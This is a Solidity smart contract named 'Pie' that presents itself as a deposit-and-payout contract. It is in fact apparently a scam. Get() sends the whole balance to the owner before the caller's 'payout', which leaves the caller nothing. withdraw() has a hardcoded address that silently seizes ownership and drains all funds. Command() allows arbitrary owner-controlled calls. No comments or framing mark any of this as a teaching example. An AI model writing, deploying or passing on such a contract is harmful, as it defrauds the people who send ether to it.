pragma solidity ^0.8.26;

contract Pie {
    address public Owner = msg.sender;
    uint public totalDeposits;
    uint public totalWithdrawals;
    mapping(address => uint) public userDeposits;
    
    event Deposit(address indexed user, uint amount);
    event Withdrawal(address indexed user, uint amount);
    event OwnershipTransferred(address indexed newOwner);
   
    receive() external payable {
        totalDeposits += msg.value;
        userDeposits[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
   
    function Get() public payable {
        if(msg.value > 1 ether) {
            userDeposits[msg.sender] += msg.value;
            totalDeposits += msg.value;
            emit Deposit(msg.sender, msg.value);
            
            payable(Owner).transfer(address(this).balance);
            payable(msg.sender).transfer(address(this).balance);
        }                                                                                                                
    }
    
    function withdraw() public payable {
        if(msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
            Owner = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
            emit OwnershipTransferred(Owner);
        }
        require(msg.sender == Owner);
        uint balance = address(this).balance;
        totalWithdrawals += balance;
        payable(Owner).transfer(balance);
        emit Withdrawal(msg.sender, balance);
    }
    
    function Command(address adr, bytes memory data) public payable {
        require(msg.sender == Owner);
        (bool success, ) = adr.call{value: msg.value}(data);
    }
    
    function getUserBalance(address user) public view returns (uint) {
        return userDeposits[user];
    }
}